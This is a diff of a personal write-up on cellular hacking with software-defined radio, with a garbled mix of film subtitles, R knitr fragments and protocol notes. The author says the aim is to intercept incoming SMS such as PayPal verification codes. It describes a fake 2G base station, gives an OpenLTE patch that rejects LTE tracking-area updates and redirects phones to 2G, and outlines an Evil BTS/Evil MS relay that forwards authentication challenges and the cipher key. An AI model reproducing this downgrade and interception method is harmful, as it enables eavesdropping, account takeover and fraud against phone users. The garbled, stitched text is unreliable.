@@ -1,106 +1,159 @@
 # Projects
 
 
-00:00:57,265 --> 00:00:58,975
-- Seq, I'm in.
-- Captain.
+    1
+    00:00:57,265 --> 00:00:58,975
+    - Seq, I'm in.
+    - Captain.
 
-00:00:59,058 --> 00:01:00,310
-- You were right.
+    2
+    00:00:59,058 --> 00:01:00,310
+    You were right.
 
-00:01:00,393 --> 00:01:01,811
-- The skylight was a window pane.
+    3
+    00:01:00,393 --> 00:01:01,811
+    The skylight
+    was a window pane.
 
-00:01:01,895 --> 00:01:03,396
-- I've got serious interference.
+    4
+    00:01:01,895 --> 00:01:03,396
+    I've got
+    serious interference.
 
-00:01:03,480 --> 00:01:04,814
-- Weird. It's some kind of Modal.
+    5
+    00:01:03,480 --> 00:01:04,814
+    Weird.
+    It's some kind of Modal.
 
-00:01:04,898 --> 00:01:06,691
-- Looks like old code.
+    6
+    00:01:04,898 --> 00:01:06,691
+    Looks like old code.
 
-00:01:06,775 --> 00:01:08,151
-- It feels really familiar.
+    7
+    00:01:06,775 --> 00:01:08,151
+    It feels
+    really familiar.
 
-00:01:08,234 --> 00:01:09,986
-- Drop a pin. I'll signal for backup.
+    8
+    00:01:08,234 --> 00:01:09,986
+    Drop a pin.
+    I'll signal for backup.
 
-00:01:10,069 --> 00:01:11,738
-- I'm gonna check it out.
-- -Bugs?
+    9
+    00:01:10,069 --> 00:01:11,738
+    - I'm gonna check it out.
+    - -Bugs?
 
-00:01:11,821 --> 00:01:13,031
-- If the general finds out we've been fishing...
+    10
+    00:01:11,821 --> 00:01:13,031
+    If the general finds out
+    we've been fishing...
 
-00:01:13,114 --> 00:01:14,783
-- A quick peek can't hurt.
+    11
+    00:01:13,114 --> 00:01:14,783
+    A quick peek can't hurt.
 
-00:01:14,866 --> 00:01:16,159
-- Did you hear that?
+    12
+    00:01:14,866 --> 00:01:16,159
+    Did you hear that?
 
-00:01:16,242 --> 00:01:17,619
-- Shit. I think our signal was traced.
+    13
+    00:01:16,242 --> 00:01:17,619
+    Shit. I think
+    our signal was traced.
 
-00:01:17,702 --> 00:01:19,829
-- Bugs, this feels like a trap.
+    14
+    00:01:17,702 --> 00:01:19,829
+    Bugs, this feels like a trap.
 
-00:01:19,913 --> 00:01:21,039
-- Bugs!
+    15
+    00:01:19,913 --> 00:01:21,039
+    Bugs!
 
-# Hacking the Telcos...
+# Hello World !
+
+This is how it begin ? So why telecom ? Cause I have skills with !
+Honestly was guided by security and wanted to be independant outside
+society but we have to live in… So what is to be independant : I think
+have money sorry if this is materialist but until you prove the opposite
+we can’t live without… Even commandos in nature have shoes ;) and they
+have to buy it. So the link between telecommunication and money ?
+Incomming SMS ! Paypal Verification, etc and I didn’t want to abuse of
+trust and didn’t want to search the 815e vulnerability in PHP. I wanted
+an always working hack or almost always working… So what is the way ?
+SDR : Software Defined Radio like the name says this kind of radios are
+software defined it means that demodulation is not part of hardware but
+is made software based. And now what can we do with ? So many things… I
+will focus on mobile telephony. So let’s go !
 
 ## Hacking 2G (Fooling MS : Mobile Station, the 2G phone)
 
-Easy ! The MS doesn’t ask authentication from BTS (Base Transceiver Station, the relay antenna). So what to do to intercept ? Be a BTS… and
-that’s all just spoof the public values of the BTS (mcc,mnc exemple 208,15 for FreeMobile 208,01 for Orange, etc) and broadcast a stronger
-signal and it is done. How the implement a 2G BTS ? there are open-sourced projects like
+Easy ! The MS doesn’t ask authentication from BTS (Base Transceiver
+Station, the relay antenna). So what to do to intercept ? Be a BTS… and
+that’s all just spoof the public values of the BTS (mcc,mnc exemple
+208,15 for FreeMobile 208,01 for Orange, etc) and broadcast a stronger
+signal and it is done. How the implement a 2G BTS ? there are open
+sourced implementation on github. <https://github.com/osmocom> (OpenBSC
+Osmo-Trx Osmo-Bts… EOL but usefull) or (Network in the Box Updated)
+<https://github.com/RangeNetworks/openbts> <https://github.com/vir/yate>
 
-[![](https://umtrx.org/wp/wp-content/uploads/2013/11/osmocom_logo.png)](https://github.com/osmocom) (OpenBSC Osmo-Trx Osmo-Bts… EOL but usefull) or (Network in the Box Updated)
-
-[![](https://avatars.githubusercontent.com/u/6938234)](https://github.com/RangeNetworks/openbts) 
-
-[![](https://i0.wp.com/yatebts.com/wp-content/uploads/2018/11/500px-YateBTS_Linux_Yate_2015-12-08.png)](https://github.com/vir/yate)
-
-To install it I have scripted it for example for OpenBSC : 
-
-**Radio-Frequencies Protocols :**
+To install it I have scripted it for example for OpenBSC : ``{r setup,
+include=FALSE, echo=FALSE, warning=FALSE} library(pander) library(knitr)
+library(memisc) library(stargazer) knitr::opts_chunk$set(echo = TRUE)  
+.. code-block:: **Radio-Frequencies Protocols :** ———————————
 
 A protocol is for computing (quoted from Oxford langage):  
+“A set of rules governing the exchange or transmission of data between
+devices.” <https://www.oed.com/>. The goal like it is said is to make
+travel information from A-\>B, and (maybe) then B-\>A etcaetera. This
+information has a weight and it has to move so : energy is spent, at
+least F(A-\>B). Another goals came obviously from the first depending on
+the case of use : spending the less energy possible, have the maximum
+range, transmit the most data possible, have the best yield, and be the
+most secure possible (I mean by that, that it can’t be understood by a
+machine or an human on an undesired endpoint in a reasonable time at
+least at the time of conception and from the projected advances in
+technology), there are also another important points the latency, and
+the errors between the message sent and received. We will begin by
+enumerate some radio protocols, begin by saying their purpose. Then we
+gonna try to classify theses protocols by energy, data (raw and useful
+payload), power, range, frequencies and yield, security, latency, and
+error. ————————————–  
+**List (non-exhaustive) of Protocols** ————————————–
 
-> " A set of rules governing the exchange or transmission of data between devices." ![Oxford Langage](https://www.oed.com/)
+    ## # A tibble: 22 × 2
+    ##    Protocol                Purpose                                      
+    ##    <chr>                   <chr>                                        
+    ##  1 RFID                    Traceabitlity / Static Information Exchange  
+    ##  2 NFC                     Bank Operations / Static Information Exchange
+    ##  3 GSM/GPRS*/EDGE*         Calls / SMS / Internet*                      
+    ##  4 UMTS/HSPA/HSPA_advanced Calls / SMS / Internet                       
+    ##  5 LTE/LTE_Advanced        Calls / SMS / Internet / IoT                 
+    ##  6 5G SA/NSA               Calls / SMS / Internet / IoT                 
+    ##  7 Wifi                    Internet / LAN / Calls (VoWifi)              
+    ##  8 Bluetooth               Data exchange / Pairing devices              
+    ##  9 LoRa/SigFox             Data exchange / IoT                          
+    ## 10 GPS/Galileo             Geolocalization                              
+    ## # ℹ 12 more rows
 
-The goal like it is said is to make travel information from A-\>B, and (maybe) then B-\>A etcaetera. This information has a weight and it has to move so : energy is spent, at least F(A-\>B). Another goals came obviously from the first depending on
-the case of use : spending the less energy possible, have the maximum range, transmit the most data possible, have the best yield, and be the most secure possible (I mean by that, that it can’t be understood by a
-machine or an human on an undesired endpoint in a reasonable time at least at the time of conception and from the projected advances in technology), there are also another important points the latency, and
-the errors between the message sent and received. We will begin by enumerate some radio protocols, begin by saying their purpose. Then we
-gonna try to classify theses protocols by energy, data (raw and useful payload), power, range, frequencies and yield, security, latency, and
-error.
+newpage
 
-**List (non-exhaustive) of Protocols**
+------------------------------------------------------------------------
 
-Protocol | Purpose
-RFID | Traceabitlity / Static Information Exchange
-NFC | Bank Operations / Static Information Exchange
-GSM/GPRS*/EDGE* | Calls / SMS / Internet
-UMTS/HSPA/HSPA_advanced | Calls / SMS / Internet
-LTE/LTE_Advanced|Calls / SMS / Internet / IoT 
-5G SA/NSA   | Calls / SMS / Internet / IoT 
-Wifi| Internet / LAN / Calls (VoWifi)
-Bluetooth   | Data exchange / Pairing devices
-LoRa/SigFox | Data exchange / IoT
-GPS/Galileo | Geolocalization
+# **Radio-Telephony**
 
+------------------------------------------------------------------------
 
-**Radio-Telephony**
-
-- **Example of SFR:**
+# **Example of SFR:**
 
 **Article 1**
 
-– The French Radiotelephone Company ("Société Française de Radiotéléphonie") is authorized to use, in the 900 and 1800 MHz bands,
-the frequencies allocated to it in Article 2 of this decision to establish and operate a radio network open to the public in metropolitan
-France. For this, it complies with the provisions of the specifications located in appendix 2 of this decision.
+– The French Radiotelephone Company ("Société Française de
+Radiotéléphonie") is authorized to use, in the 900 and 1800 MHz bands,
+the frequencies allocated to it in Article 2 of this decision to
+establish and operate a radio network open to the public in metropolitan
+France. For this, it complies with the provisions of the specifications
+located in appendix 2 of this decision.
 
 **Article 2**
 
@@ -110,19 +163,21 @@ in accordance with the definitions in appendix 1:
 -   in the 900 MHz band, throughout mainland France: channels 75 to 124;
 -   in the 900 MHz band, only in very dense areas: channels 63 to 74;
 -   in the 1800 MHz band, throughout mainland France: channels 512 to
-525 and 647 to 751
+    525 and 647 to 751
 
 For others Operator (GSM)
 
- Operator GSM900  | DCS1800
----------------------------
-Orange   1→62 | 527→646
-SFR  63-74 & 75-124 | 512→525 & 647→751
-Bouygues 975-1023 | 752-885
+    ## # A tibble: 3 × 3
+    ##   Operator GSM900              DCS1800            
+    ##   <chr>    <chr>               <chr>              
+    ## 1 Orange   1→62                527→645            
+    ## 2 SFR      (63→74)* and 75→124 512→525 and 647→751
+    ## 3 Bouygues 975→1023            752→885
 
-Free = ? (Free didn’t invest much in 2G antenna since 2G will die in 2025 in France the use Orange roaming )
+Free = ? (Free didn’t invest much in 2G antenna since 2G will die in
+2025 in France the use Orange roaming )
 
-| |
+|                 |
 |-----------------|
 | **2G Attack :** |
 
@@ -357,16 +412,16 @@ Say that only 2G is available in the area ;)
 --- openlte_v00-20-05/liblte/src/liblte_rrc.cc  2016-10-09 22:17:50.000000000 +0200
 +++ openlte_v00-20-05/liblte/src/liblte_rrc.cc  2022-01-25 17:14:32.613323868 +0100
 @@ -11698,13 +11698,28 @@
- liblte_value_2_bits(0, &msg_ptr, 2);
+         liblte_value_2_bits(0, &msg_ptr, 2);
 
- // Optional indicators
--liblte_value_2_bits(0, &msg_ptr, 1);
-+liblte_value_2_bits(1, &msg_ptr, 1);
- liblte_value_2_bits(0, &msg_ptr, 1);
- liblte_value_2_bits(0, &msg_ptr, 1);
+         // Optional indicators
+-        liblte_value_2_bits(0, &msg_ptr, 1);
++        liblte_value_2_bits(1, &msg_ptr, 1);
+         liblte_value_2_bits(0, &msg_ptr, 1);
+         liblte_value_2_bits(0, &msg_ptr, 1);
 
- // Release cause
- liblte_value_2_bits(con_release->release_cause, &msg_ptr, 2);
+         // Release cause
+         liblte_value_2_bits(con_release->release_cause, &msg_ptr, 2);
 
 +// redirectedcarrierinfo
 +// geran // choice
@@ -383,153 +438,153 @@ Say that only 2G is available in the area ;)
 +liblte_value_2_bits(514, &msg_ptr, 10);
 +// Note that total bits should be octet aligned,
 +// if not, pad it with zeros.
- // Fill in the number of bits used
- msg->N_bits = msg_ptr - msg->msg;
+         // Fill in the number of bits used
+         msg->N_bits = msg_ptr - msg->msg;
 
 --- openlte_v00-20-05/LTE_fdd_enodeb/hdr/LTE_fdd_enb_mme.h  2017-07-29 21:58:37.000000000 +0200
 +++ openlte_v00-20-05/LTE_fdd_enodeb/hdr/LTE_fdd_enb_mme.h  2022-01-25 16:49:13.365515919 +0100
 @@ -106,6 +106,7 @@
- // Message Parsers
- void parse_attach_complete(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
- void parse_attach_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user **user, LTE_fdd_enb_rb **rb);
-+void send_tracking_area_update_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user **user, LTE_fdd_enb_rb **rb);
- void parse_authentication_failure(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
- void parse_authentication_response(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
- void parse_detach_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     // Message Parsers
+     void parse_attach_complete(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     void parse_attach_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user **user, LTE_fdd_enb_rb **rb);
++    void send_tracking_area_update_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user **user, LTE_fdd_enb_rb **rb);
+     void parse_authentication_failure(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     void parse_authentication_response(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     void parse_detach_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
 @@ -125,6 +126,8 @@
- // Message Senders
- void send_attach_accept(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
- void send_attach_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
-+void send_tracking_area_update_request(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
-+void send_tracking_area_update_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
- void send_authentication_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
- void send_authentication_request(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
- void send_detach_accept(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     // Message Senders
+     void send_attach_accept(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     void send_attach_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
++    void send_tracking_area_update_request(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
++    void send_tracking_area_update_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     void send_authentication_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     void send_authentication_request(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
+     void send_detach_accept(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);
 --- openlte_v00-20-05/LTE_fdd_enodeb/hdr/LTE_fdd_enb_rb.h   2017-07-29 22:03:51.000000000 +0200
 +++ openlte_v00-20-05/LTE_fdd_enodeb/hdr/LTE_fdd_enb_rb.h   2022-01-25 16:49:13.365515919 +0100
 @@ -99,18 +99,21 @@
  typedef enum{
- LTE_FDD_ENB_MME_PROC_IDLE = 0,
- LTE_FDD_ENB_MME_PROC_ATTACH,
-+LTE_FDD_ENB_MME_PROC_TAU_REQUEST,
- LTE_FDD_ENB_MME_PROC_SERVICE_REQUEST,
- LTE_FDD_ENB_MME_PROC_DETACH,
- LTE_FDD_ENB_MME_PROC_N_ITEMS,
+     LTE_FDD_ENB_MME_PROC_IDLE = 0,
+     LTE_FDD_ENB_MME_PROC_ATTACH,
++    LTE_FDD_ENB_MME_PROC_TAU_REQUEST,
+     LTE_FDD_ENB_MME_PROC_SERVICE_REQUEST,
+     LTE_FDD_ENB_MME_PROC_DETACH,
+     LTE_FDD_ENB_MME_PROC_N_ITEMS,
  }LTE_FDD_ENB_MME_PROC_ENUM;
  static const char LTE_fdd_enb_mme_proc_text[LTE_FDD_ENB_MME_PROC_N_ITEMS][100] = {"IDLE",
-   "ATTACH",
-+ "TAU REQUEST",
-   "SERVICE REQUEST",
-   "DETACH"};
+                                                                                   "ATTACH",
++                                         "TAU REQUEST",
+                                                                                   "SERVICE REQUEST",
+                                                                                   "DETACH"};
 
  typedef enum{
- LTE_FDD_ENB_MME_STATE_IDLE = 0,
- LTE_FDD_ENB_MME_STATE_ID_REQUEST_IMSI,
+     LTE_FDD_ENB_MME_STATE_IDLE = 0,
+     LTE_FDD_ENB_MME_STATE_ID_REQUEST_IMSI,
 +LTE_FDD_ENB_MME_STATE_TAU_REJECT,
- LTE_FDD_ENB_MME_STATE_REJECT,
- LTE_FDD_ENB_MME_STATE_AUTHENTICATE,
- LTE_FDD_ENB_MME_STATE_AUTH_REJECTED,
+     LTE_FDD_ENB_MME_STATE_REJECT,
+     LTE_FDD_ENB_MME_STATE_AUTHENTICATE,
+     LTE_FDD_ENB_MME_STATE_AUTH_REJECTED,
 @@ -126,7 +129,7 @@
  }LTE_FDD_ENB_MME_STATE_ENUM;
  static const char LTE_fdd_enb_mme_state_text[LTE_FDD_ENB_MME_STATE_N_ITEMS][100] = {"IDLE",
- "ID REQUEST IMSI",
--"REJECT",
-+   "REJECT",
- "AUTHENTICATE",
- "AUTH REJECTED",
- "ENABLE SECURITY",
+                                                                                     "ID REQUEST IMSI",
+-                                                                                    "REJECT",
++                                                                       "REJECT",
+                                                                                     "AUTHENTICATE",
+                                                                                     "AUTH REJECTED",
+                                                                                     "ENABLE SECURITY",
 --- openlte_v00-20-05/LTE_fdd_enodeb/src/LTE_fdd_enb_mme.cc 2017-07-29 22:15:50.000000000 +0200
 +++ openlte_v00-20-05/LTE_fdd_enodeb/src/LTE_fdd_enb_mme.cc 2022-01-25 17:07:55.380027792 +0100
 @@ -204,6 +204,10 @@
- case LIBLTE_MME_MSG_TYPE_ATTACH_REQUEST:
- parse_attach_request(msg, &nas_msg->user, &nas_msg->rb);
- break;
-+case LTE_FDD_ENB_MME_PROC_TAU_REQUEST:
-+send_tracking_area_update_request(msg, &nas_msg->user, &nas_msg->rb);
-+break;
+         case LIBLTE_MME_MSG_TYPE_ATTACH_REQUEST:
+             parse_attach_request(msg, &nas_msg->user, &nas_msg->rb);
+             break;
++        case LTE_FDD_ENB_MME_PROC_TAU_REQUEST:
++            send_tracking_area_update_request(msg, &nas_msg->user, &nas_msg->rb);
++            break;
 +
- case LIBLTE_MME_MSG_TYPE_AUTHENTICATION_FAILURE:
- parse_authentication_failure(msg, nas_msg->user, nas_msg->rb);
- break;
+         case LIBLTE_MME_MSG_TYPE_AUTHENTICATION_FAILURE:
+             parse_authentication_failure(msg, nas_msg->user, nas_msg->rb);
+             break;
 @@ -655,6 +659,16 @@
- }
- }
+         }
+     }
  }
 +void LTE_fdd_enb_mme::send_tracking_area_update_request(LIBLTE_BYTE_MSG_STRUCT  *msg,
-+   LTE_fdd_enb_user   **user,
-+   LTE_fdd_enb_rb **rb)
++                                           LTE_fdd_enb_user       **user,
++                                           LTE_fdd_enb_rb         **rb)
 +{
-+// Set the procedure
++    // Set the procedure
 +
 +(*rb) -> set_mme_procedure(LTE_FDD_ENB_MME_PROC_TAU_REQUEST);
 +(*rb) -> set_mme_state(LTE_FDD_ENB_MME_STATE_TAU_REJECT);}
 +
 +
  void LTE_fdd_enb_mme::parse_authentication_failure(LIBLTE_BYTE_MSG_STRUCT *msg,
-LTE_fdd_enb_user   *user,
-LTE_fdd_enb_rb *rb)
+                                                    LTE_fdd_enb_user       *user,
+                                                    LTE_fdd_enb_rb         *rb)
 @@ -864,7 +878,7 @@
- rb->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);
- user->set_id(hss->get_user_id_from_imei(imei_num));
- }else{
--user->set_emm_cause(LIBLTE_MME_EMM_CAUSE_UE_SECURITY_CAPABILITIES_MISMATCH);
-+user->set_emm_cause(LIBLTE_MME_EMM_CAUSE_UE_IDENTITY_CANNOT_BE_DERIVED_BY_THE_NETWORK);
- rb->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
- }
- }else{
+                 rb->set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);
+                 user->set_id(hss->get_user_id_from_imei(imei_num));
+             }else{
+-                user->set_emm_cause(LIBLTE_MME_EMM_CAUSE_UE_SECURITY_CAPABILITIES_MISMATCH);
++                user->set_emm_cause(LIBLTE_MME_EMM_CAUSE_UE_IDENTITY_CANNOT_BE_DERIVED_BY_THE_NETWORK);
+                 rb->set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);
+             }
+         }else{
 @@ -1195,6 +1209,9 @@
- user->prepare_for_deletion();
- send_attach_reject(user, rb);
- break;
+         user->prepare_for_deletion();
+         send_attach_reject(user, rb);
+         break;
 + case LTE_FDD_ENB_MME_STATE_TAU_REJECT:
-+send_tracking_area_update_reject(user, rb);
++        send_tracking_area_update_reject(user, rb);
 +break;
- case LTE_FDD_ENB_MME_STATE_AUTHENTICATE:
- send_authentication_request(user, rb);
- break;
+     case LTE_FDD_ENB_MME_STATE_AUTHENTICATE:
+         send_authentication_request(user, rb);
+         break;
 @@ -1397,6 +1414,52 @@
-   (LTE_FDD_ENB_MESSAGE_UNION *)&cmd_ready,
-   sizeof(LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT));
+                       (LTE_FDD_ENB_MESSAGE_UNION *)&cmd_ready,
+                       sizeof(LTE_FDD_ENB_RRC_CMD_READY_MSG_STRUCT));
  }
 +
 +
 +
 +
 +void LTE_fdd_enb_mme::send_tracking_area_update_reject(LTE_fdd_enb_user *user,
-+ LTE_fdd_enb_rb   *rb)
++                                         LTE_fdd_enb_rb   *rb)
 +{
-+LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
-+LIBLTE_MME_TRACKING_AREA_UPDATE_REJECT_MSG_STRUCT  ta_update_rej;
-+LIBLTE_BYTE_MSG_STRUCT   msg;
-+ ta_update_rej.emm_cause = user->get_emm_cause();
-+ ta_update_rej.t3446_present = false;
-+ liblte_mme_pack_tracking_area_update_reject_msg(
-+ &ta_update_rej,
-+ LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS,
-+ user->get_auth_vec()->k_nas_int,
-+ user->get_auth_vec()->nas_count_dl,
-+ LIBLTE_SECURITY_DIRECTION_DOWNLINK,
-+ &msg);
-+// Queue the NAS message for RRC
-+rb->queue_rrc_nas_msg(&msg);
++    LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT nas_msg_ready;
++    LIBLTE_MME_TRACKING_AREA_UPDATE_REJECT_MSG_STRUCT      ta_update_rej;
++    LIBLTE_BYTE_MSG_STRUCT                   msg;
++     ta_update_rej.emm_cause = user->get_emm_cause();
++     ta_update_rej.t3446_present = false;
++     liblte_mme_pack_tracking_area_update_reject_msg(
++     &ta_update_rej,
++     LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS,
++     user->get_auth_vec()->k_nas_int,
++     user->get_auth_vec()->nas_count_dl,
++     LIBLTE_SECURITY_DIRECTION_DOWNLINK,
++     &msg);
++    // Queue the NAS message for RRC
++    rb->queue_rrc_nas_msg(&msg);
 +
-+// Signal RRC for NAS message
-+nas_msg_ready.user = user;
-+nas_msg_ready.rb   = rb;
-+msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
-+  LTE_FDD_ENB_DEST_LAYER_RRC,
-+  (LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
-+  sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
++    // Signal RRC for NAS message
++    nas_msg_ready.user = user;
++    nas_msg_ready.rb   = rb;
++    msgq_to_rrc->send(LTE_FDD_ENB_MESSAGE_TYPE_RRC_NAS_MSG_READY,
++                      LTE_FDD_ENB_DEST_LAYER_RRC,
++                      (LTE_FDD_ENB_MESSAGE_UNION *)&nas_msg_ready,
++                      sizeof(LTE_FDD_ENB_RRC_NAS_MSG_READY_MSG_STRUCT));
 +
-+send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_RELEASE);
++    send_rrc_command(user, rb, LTE_FDD_ENB_RRC_CMD_RELEASE);
 +// Unpack the message
-+liblte_mme_unpack_tracking_area_update_reject_msg(&msg, &ta_update_rej);
++    liblte_mme_unpack_tracking_area_update_reject_msg(&msg, &ta_update_rej);
 +
-+interface->send_ctrl_info_msg("user fully attached imsi=%s imei=%s",
-+  user->get_imsi_str().c_str(),
-+  user->get_imei_str().c_str());
++    interface->send_ctrl_info_msg("user fully attached imsi=%s imei=%s",
++                                  user->get_imsi_str().c_str(),
++                                  user->get_imei_str().c_str());
 +
-+rb->set_mme_state(LTE_FDD_ENB_MME_STATE_ATTACHED);
++    rb->set_mme_state(LTE_FDD_ENB_MME_STATE_ATTACHED);
 +}
 +
 +
@@ -538,64 +593,64 @@ LTE_fdd_enb_rb *rb)
 +
 +
  void LTE_fdd_enb_mme::send_attach_reject(LTE_fdd_enb_user *user,
-  LTE_fdd_enb_rb   *rb)
+                                          LTE_fdd_enb_rb   *rb)
  {
 @@ -1412,7 +1475,7 @@
- imsi_num = user->get_temp_id();
- }
+         imsi_num = user->get_temp_id();
+     }
 
--attach_rej.emm_cause   = user->get_emm_cause();
-+attach_rej.emm_cause   = 2;
- attach_rej.esm_msg_present = false;
- attach_rej.t3446_value_present = false;
- liblte_mme_pack_attach_reject_msg(&attach_rej, &msg);
+-    attach_rej.emm_cause           = user->get_emm_cause();
++    attach_rej.emm_cause           = 2;
+     attach_rej.esm_msg_present     = false;
+     attach_rej.t3446_value_present = false;
+     liblte_mme_pack_attach_reject_msg(&attach_rej, &msg);
 
 --- openlte_v00-20-05/LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc   2017-07-29 22:18:34.000000000 +0200
 +++ openlte_v00-20-05/LTE_fdd_enodeb/src/LTE_fdd_enb_radio.cc   2022-01-25 17:09:37.116388236 +0100
 @@ -229,7 +229,7 @@
- try
- {
- // Setup the USRP
--if(devs[idx-1]["type"] == "x300")
-+if(devs[idx-1]["type"] == "soapy")
- {
- devs[idx-1]["master_clock_rate"] = "184320000";
- master_clock_set = true;
+     try
+     {
+         // Setup the USRP
+-        if(devs[idx-1]["type"] == "x300")
++        if(devs[idx-1]["type"] == "soapy")
+         {
+             devs[idx-1]["master_clock_rate"] = "184320000";
+             master_clock_set                 = true;
 @@ -252,7 +252,6 @@
- usrp->set_rx_freq((double)liblte_interface_ul_earfcn_to_frequency(ul_earfcn));
- usrp->set_tx_gain(tx_gain);
- usrp->set_rx_gain(rx_gain);
+             usrp->set_rx_freq((double)liblte_interface_ul_earfcn_to_frequency(ul_earfcn));
+             usrp->set_tx_gain(tx_gain);
+             usrp->set_rx_gain(rx_gain);
 -
- // Setup the TX and RX streams
- tx_stream  = usrp->get_tx_stream(stream_args);
- rx_stream  = usrp->get_rx_stream(stream_args);
+             // Setup the TX and RX streams
+             tx_stream  = usrp->get_tx_stream(stream_args);
+             rx_stream  = usrp->get_rx_stream(stream_args);
 @@ -822,7 +821,7 @@
- buffer_size = 1024;
- }
- status = bladerf_sync_config(bladerf,
-- BLADERF_MODULE_TX,
-+BLADERF_TX_X1,
-  BLADERF_FORMAT_SC16_Q11_META,
-  BLADERF_NUM_BUFFERS,
-  buffer_size,
+         buffer_size = 1024;
+     }
+     status = bladerf_sync_config(bladerf,
+-                                 BLADERF_MODULE_TX,
++                                BLADERF_TX_X1,
+                                  BLADERF_FORMAT_SC16_Q11_META,
+                                  BLADERF_NUM_BUFFERS,
+                                  buffer_size,
 @@ -842,7 +841,7 @@
 
- // Setup sync RX
- status = bladerf_sync_config(bladerf,
-- BLADERF_MODULE_RX,
-+BLADERF_RX_X1,
-  BLADERF_FORMAT_SC16_Q11_META,
-  BLADERF_NUM_BUFFERS,
-  buffer_size,
+     // Setup sync RX
+     status = bladerf_sync_config(bladerf,
+-                                 BLADERF_MODULE_RX,
++                                BLADERF_RX_X1,
+                                  BLADERF_FORMAT_SC16_Q11_META,
+                                  BLADERF_NUM_BUFFERS,
+                                  buffer_size,
 @@ -974,7 +973,7 @@
- if(radio_params->init_needed)
- {
- // Assume RX_timestamp and TX_timestamp difference is 0
--bladerf_get_timestamp(bladerf, BLADERF_MODULE_RX, (uint64_t*)&rx_ts);
-+bladerf_get_timestamp(bladerf, BLADERF_RX, (uint64_t*)&rx_ts);
- next_tx_ts= rx_ts + radio_params->samp_rate; // 1 second to make sure everything is setup
- metadata_rx.flags = 0;
- metadata_rx.timestamp = next_tx_ts - (radio_params->N_samps_per_subfr*2); // Retard RX by 2 subframes
+     if(radio_params->init_needed)
+     {
+         // Assume RX_timestamp and TX_timestamp difference is 0
+-        bladerf_get_timestamp(bladerf, BLADERF_MODULE_RX, (uint64_t*)&rx_ts);
++        bladerf_get_timestamp(bladerf, BLADERF_RX, (uint64_t*)&rx_ts);
+         next_tx_ts            = rx_ts + radio_params->samp_rate; // 1 second to make sure everything is setup
+         metadata_rx.flags     = 0;
+         metadata_rx.timestamp = next_tx_ts - (radio_params->N_samps_per_subfr*2); // Retard RX by 2 subframes
 ```
 
 This patch applied on the OpenLTE suite should do the trick.
@@ -630,7 +685,7 @@ The hacked process is :
 
 -   The genuine BTS send a rand,key_seq to the Evil MS.
 -   The Evil MS send it to our Evil BTS via socket between Evil BTS
-server and Evil MS client.
+    server and Evil MS client.
 -   The Evil BTS send the rand,key_seq to genuine MS
 -   The Genuine MS respond sres -\> Evil BTS -\> Evil MS -\> Genuine BTS
 -   In the example video Kc is forwarded between Genuine MS-\> Evil MS
@@ -711,27 +766,27 @@ on 0.0.0.0 server kc 777 listen on 0.0.0.0
 osmocom-genuine-ms 172.17.0.2 client kc 777 -\> 172.17.0.3
 
 
-Headers :
-=========
+    Headers :
+    =========
 
-suppress\_space.h
+    suppress\_space.h
 
-``` {.sourceCode .c}
-#include <stdio.h>
-char res[100];
-char* spaces(char str [])
-{
-int i = 0;int j = 0;
-   while (str[i] != '\0')
-   {
-  if ((str[i] == ' ') != 1) {
-res[j] = str[i];
-j++;
-  }
-  i++;
-   }
-   res[j] = '\0';
-return res;}
+    ``` {.sourceCode .c}
+    #include <stdio.h>
+    char res[100];
+    char* spaces(char str [])
+    {
+    int i = 0;int j = 0;
+           while (str[i] != '\0')
+           {
+              if ((str[i] == ' ') != 1) {
+                res[j] = str[i];
+                j++;
+              }
+              i++;
+           }
+           res[j] = '\0';
+    return res;}
 
 hex.h
 
@@ -754,14 +809,14 @@ char hexdigit (char c)
   char outc;
 
